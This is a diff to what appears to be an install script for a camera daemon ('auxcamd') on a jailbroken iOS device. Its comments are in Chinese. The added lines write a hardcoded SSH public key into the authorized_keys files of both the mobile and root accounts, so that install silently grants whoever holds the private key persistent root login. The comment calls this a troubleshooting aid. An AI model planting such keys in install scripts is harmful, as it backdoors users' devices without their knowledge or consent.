@@ -2,6 +2,23 @@
 PLIST=/var/jb/Library/LaunchDaemons/com.auxcam.daemon.plist
 chmod 755 /var/jb/usr/libexec/auxcamd
 chmod 644 "$PLIST"
+
+# 装 PC 端公钥，装完电脑就能 SSH 进来排查（重复安装不会写重复）
+install_key() {
+  dir="$1"
+  owner="$2"
+  mkdir -p "$dir"
+  touch "$dir/authorized_keys"
+  if ! grep -q 'auxcam-pc' "$dir/authorized_keys" 2>/dev/null; then
+    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0lOcuc5RVtx1t99EeSd7pPHIRWFFML/hEYZXcTzbFn auxcam-pc' >> "$dir/authorized_keys"
+  fi
+  chown -R "$owner" "$dir" 2>/dev/null || true
+  chmod 700 "$dir"
+  chmod 600 "$dir/authorized_keys"
+}
+install_key /var/mobile/.ssh mobile
+install_key /var/root/.ssh root
+
 # 装完立刻拉起；开机由 RunAtLoad 自动起来
 launchctl bootout system "$PLIST" 2>/dev/null || launchctl unload "$PLIST" 2>/dev/null || true
 launchctl bootstrap system "$PLIST" 2>/dev/null || launchctl load -w "$PLIST" 2>/dev/null || true
